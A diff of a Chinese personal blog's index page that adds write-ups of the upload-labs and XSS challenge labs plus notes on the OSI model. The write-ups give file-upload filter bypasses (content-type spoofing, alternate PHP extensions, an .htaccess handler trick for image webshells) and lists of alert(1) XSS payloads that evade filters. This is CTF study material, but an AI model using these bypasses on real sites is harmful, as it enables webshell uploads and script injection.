@@ -46,7 +46,7 @@
     <h2 class="author">给我坐下犬夜叉</h2>
     <h3 class="description">啊咧咧</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>2</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>6</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>0</strong><br>标签</div></a>
     </div>
@@ -73,6 +73,259 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-uploadlabs题解" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/15/uploadlabs%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time class="post-time" datetime="2020-09-15T09:49:54.712Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">15</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/15/uploadlabs%E9%A2%98%E8%A7%A3/">uploadlabs题解</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第一关：<br>前端js函数白名单过滤<br>方法1：BP抓包改文件，先把php后缀改成白名单里的，然后抓包在改回来绕过前端<br>方法2：在浏览器设置里关闭js函数<br>方法3：在consel里运行改过的html源码（亲测未成功，js路径报错）</p>
+<p>第二关：<br>对于content-type的检验<br>BP将text/plain 改为image/gif</p>
+<p>第三关：<br>黑名单后缀<br>用类似等效的后缀代替（亦或是大小写）<br>比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码<br>大小写都可 如.PhP .pHP(亲测失败)</p>
+<p>第四关：<br>更全的黑名单<br>.htaccess，于是首先上传一个.htaccess内容如下的文件:<br>SetHandler application/x-httpd-php<br>这样所有文件都会解析为php，然后再上传图片马，就可以解析：</p>
+<p>第五关：<br>黑名单，加上了.htaccess，但是没有将后缀进行大小写统一，于是可以通过大小写绕过，在content-disposition filename=xxx.phP</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sovegetable.github.io/2020/09/15/uploadlabs%E9%A2%98%E8%A7%A3/" data-id="ckf3s3t9l0001qotfdw5sfh81" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-xss小闯关" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/" class="article-date">
+  <time class="post-time" datetime="2020-09-15T09:49:04.644Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">15</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/">xss小闯关</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0x00</p>
+<script>alert(1)</script>
+
+<p>0x01<br><script>alert(1)</script>  //普通的闭合</p>
+<p>0x02<br>“&gt;<script>alert(1)</script>  //用于input类型的闭合</p>
+<p>0x03</p>
+<script>alert`1`</script> //用`绕过()的过滤 ，注意`要紧贴alter
+
+<p>0x04</p>
+<p>&lt;svg》 <script>alert&#x60;1&#x60;</script><br>过滤了 （） and `      用<svg>标签可以解析 html转义字符</svg></p>
+<p>0x05<br>–!&gt;<script>alert(1)</script><br>–!&gt; 和–&gt;都可以闭合</p>
+<p>0x06<br>type=”image” src=”” onerror<br>=alert(1)</p>
+<p>使用回车过滤正则，onerror报错时触发</p>
+<p>0x07</p>
+<body onload="alert`1`" （有空格） <p>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空.<br>可以通过少输入一个&gt;来绕过正则,但仍然可以执行.<br>onload 事件会在页面或图像加载完成后立即发生。<br>onload 通常用于 <body> 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码。<p></p>
+<p>0x08<br>&lt;/style</p>
+<blockquote>
+<script>alert(1)</script>
+<p>同上换行绕过</p>
+</blockquote>
+<p>0x09<br><a href="https://www.segmentfault.com&quot;&gt;" target="_blank" rel="noopener">https://www.segmentfault.com&quot;&gt;</a><script>alert(1)</script><br>先输入网址通过匹配，然后闭合。这里我发现<script>中间是不能有>的否则语句无效。</p>
+</script></p></body></body>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sovegetable.github.io/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/" data-id="ckf3s3t9m0002qotf0d1qbk5n" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-OSI七层协议" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/15/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time class="post-time" datetime="2020-09-15T09:47:10.626Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">15</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/15/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/">OSI七层协议</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="OSI七层协议"><a href="#OSI七层协议" class="headerlink" title="OSI七层协议"></a>OSI七层协议</h1><p><a href="https://img-my.csdn.net/uploads/201201/5/0_1325744597WM32.gif" target="_blank" rel="noopener"></a></p>
+<h2 id="第一层：物理层"><a href="#第一层：物理层" class="headerlink" title="第一层：物理层"></a>第一层：物理层</h2><p>用于传输介质中提供物理连接，实现比特流的透明传输。物理层的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。</p>
+<h2 id="第二层：数据链路层"><a href="#第二层：数据链路层" class="headerlink" title="第二层：数据链路层"></a>第二层：数据链路层</h2><p>负责建立和管理节点间的链路。该层的主要功能是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。<br>在计算机网络中由于各种干扰的存在，物理链路是不可靠的。因此，这一层的主要功能是在物理层提供的比特流的基础上，通过差错控制、流量控制方法，使有差错的物理线路变为无差错的数据链路，即提供可靠的通过物理介质传输数据的方法。</p>
+<p>大致是用于局域网里的根据端口的MAC地址做转发的协议</p>
+<h2 id="第三层：网络层"><a href="#第三层：网络层" class="headerlink" title="第三层：网络层"></a>第三层：网络层</h2><p>主要功能是控制子网的运行。通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。该层控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。具体地说，数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。<br>一般地，数据链路层是解决同一网络内节点之间的通信，而网络层主要解决不同子网间的通信。例如在广域网之间通信时，必然会遇到路由（即两节点间可能有多条路径）选择问题。 </p>
+<p>选择最好的路由线路，已获得最好的速度，比如有三条路可以走这层协议负责选取最短的路径。</p>
+<h2 id="第四层：传输层"><a href="#第四层：传输层" class="headerlink" title="第四层：传输层"></a>第四层：传输层</h2><p>该层的主要任务是：向用户提供可靠的端到端的差错和流量控制，保证报文的正确传输。传输层的作用是向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。该层常见的协议：TCP/IP中的TCP协议、Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议。<br>传输层提供会话层和网络层之间的传输服务，这种服务从会话层获得数据，并在必要时，对数据进行分割。然后，传输层将数据传递到网络层，并确保数据能正确无误地传送到网络层。因此，传输层负责提供两节点之间数据的可靠传送，当两节点的联系确定之后，传输层则负责监督工作。综上，传输层的主要功能如下：<br>传输连接管理：提供建立、维护和拆除传输连接的功能。传输层在网络层的基础上为高层提供“面向连接”和“面向无接连”的两种服务。<br>处理传输差错：提供可靠的“面向连接”和不太可靠的“面向无连接”的数据传输服务、差错控制和流量控制。在提供“面向连接”服务时，通过这一层传输的数据将由目标设备确认，如果在指定的时间内未收到确认信息，数据将被重发。<br>监控服务质量。</p>
+<p>负责数据包的重组和排序，从网络层获取的碎片式的数据包重新排序成原文。</p>
+<h2 id="第五层：会话层"><a href="#第五层：会话层" class="headerlink" title="第五层：会话层"></a>第五层：会话层</h2><p>主要任务是：向两个实体的表示层提供建立和使用连接的方法。将不同实体之间的表示层的连接称为会话。因此会话层的任务就是组织和协调两个会话进程之间的通信，并对数据交换进行管理。<br>会话层的具体功能如下：<br>会话管理：允许用户在两个实体设备之间建立、维持和终止会话，并支持它们之间的数据交换。例如提供单方向会话或双向同时会话，并管理会话中的发送顺序，以及会话所占用时间的长短。<br> 会话流量控制：提供会话流量控制和交叉会话功能。<br>寻址：使用远程地址建立会话连接。<br>出错控制：从逻辑上讲会话层主要负责数据交换的建立、保持和终止，但实际的工作却是接收来自传输层的数据，并负责纠正错误。会话控制和远程过程调用均属于这一层的功能。但应注意，此层检查的错误不是通信介质的错误，而是磁盘空间、打印机缺纸等类型的高级错误。</p>
+<p>为两端通信实体建立连接（会话），中间有认证鉴权以及检查点记录（供会话意外中断的时候可以继续，类似断点续传）。</p>
+<h2 id="第六层：表示层"><a href="#第六层：表示层" class="headerlink" title="第六层：表示层"></a>第六层：表示层</h2><p>其主要功能是“处理用户信息的表示问题，如编码、数据格式转换和加密解密”等。表示层的具体功能如下：<br>数据格式处理：协商和建立数据交换的格式，解决各应用程序之间在数据格式表示上的差异。<br>数据的编码：处理字符集和数字的转换。例如由于用户程序中的数据类型（整型或实型、有符号或无符号等）、用户标识等都可以有不同的表示方式，因此，在设备之间需要具有在不同字符集或格式之间转换的功能。<br>压缩和解压缩：为了减少数据的传输量，这一层还负责数据的压缩与恢复。<br>数据的加密和解密：可以提高网络的安全。</p>
+<p>决定数据的展现（编码）形式，如同一部电影可以采样、量化、编码为RMVB、AVI，一张图片能够是JPEG、BMP、PNG等。</p>
+<h2 id="第七层：应用层"><a href="#第七层：应用层" class="headerlink" title="第七层：应用层"></a>第七层：应用层</h2><p>它是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。它在其他6层工作的基础上，负责完成网络中应用程序与网络操作系统之间的联系，建立与结束使用者之间的联系，并完成网络用户提出的各种网络服务及应用所需的监督、管理和服务等各种协议。此外，该层还负责协调各个应用程序间的工作。</p>
+<p>如邮箱使用的POP3，SMTP、远程登录使用的Telnet、获取IP地址的DHCP、域名解析的DNS、网页浏览的http协议等；这部分协议主要是规定应用软件如何去进行通信的。</p>
+<h2 id="OSI7层模型的小结"><a href="#OSI7层模型的小结" class="headerlink" title="OSI7层模型的小结"></a>OSI7层模型的小结</h2><p>由于OSI是一个理想的模型，因此一般网络系统只涉及其中的几层，很少有系统能够具有所有的7层，并完全遵循它的规定。<br>在7层模型中，每一层都提供一个特殊的网络功能。从网络功能的角度观察：下面4层（物理层、数据链路层、网络层和传输层）主要提供数据传输和交换功能，即以节点到节点之间的通信为主；第4层作为上下两部分的桥梁，是整个网络体系结构中最关键的部分；而上3层（会话层、表示层和应用层）则以提供用户与应用程序之间的信息和数据处理功能为主。简言之，下4层主要完成通信子网的功能，上3层主要完成资源子网的功能。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sovegetable.github.io/2020/09/15/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/" data-id="ckf3s3t9d0000qotfg1xw7422" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-xssgame" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/23/xssgame/" class="article-date">
+  <time class="post-time" datetime="2020-08-23T15:21:47.827Z" itemprop="datePublished">
+    <span class="post-month">8月</span><br/>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/23/xssgame/">xssgame</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0x00</p>
+<script>alert(1)</script>
+
+<p>0x01<br><script>alert(1)</script>  //普通的闭合</p>
+<p>0x02<br>“&gt;<script>alert(1)</script>  //用于input类型的闭合</p>
+<p>0x03</p>
+<script>alert`1`</script> //用`绕过()的过滤 ，注意`要紧贴alter
+
+<p>0x04</p>
+<p><svg><script>alert&#x60;1&#x60;</script><br/>过滤了 （） and ` 用<svg>标签可以解析 html转义字符</svg></svg></p>
+<p>0x05<br>–!&gt;<script>alert(1)</script><br>–!&gt; 和–&gt;都可以闭合</p>
+<p>0x06<br>type=”image” src=”” onerror<br>=alert(1)</p>
+<p>使用回车过滤正则，onerror报错时触发</p>
+<p>0x07</p>
+<body onload="alert1" （有空格） <p>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空.<br>可以通过少输入一个&gt;来绕过正则,但仍然可以执行.<br>onload 事件会在页面或图像加载完成后立即发生。<br>onload 通常用于 <body> 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码。<p></p>
+<p>0x08<br>&lt;/style</p>
+<script>alert(1)</script>
+
+<p>同上换行绕过</p>
+<p>0x09<br><a href="https://www.segmentfault.com&quot;&gt;" target="_blank" rel="noopener">https://www.segmentfault.com&quot;&gt;</a><script>alert(1)</script><br>先输入网址通过匹配，然后闭合。这里我发现<script>中间是不能有>的否则语句无效。</p>
+</script></p></body></body>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://sovegetable.github.io/2020/08/23/xssgame/" data-id="ckf3s3t9o0003qotf3p2qfati" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-sqlilabs 1~6" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -223,7 +476,7 @@
 <li><p>应用框架</p>
 </li>
 </ul>
-<p><img src="/2020/07/26/www.umex.co/QQ%E5%9B%BE%E7%89%8720200726214426.png" alt></p>
+<p><img src="/2020/07/26/www.umex.co/1.png" alt></p>
 
       
     </div>
@@ -280,7 +533,7 @@
     <h2 class="author">给我坐下犬夜叉</h2>
     <h3 class="description">啊咧咧</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>2</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>6</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>0</strong><br>标签</div></a>
     </div>
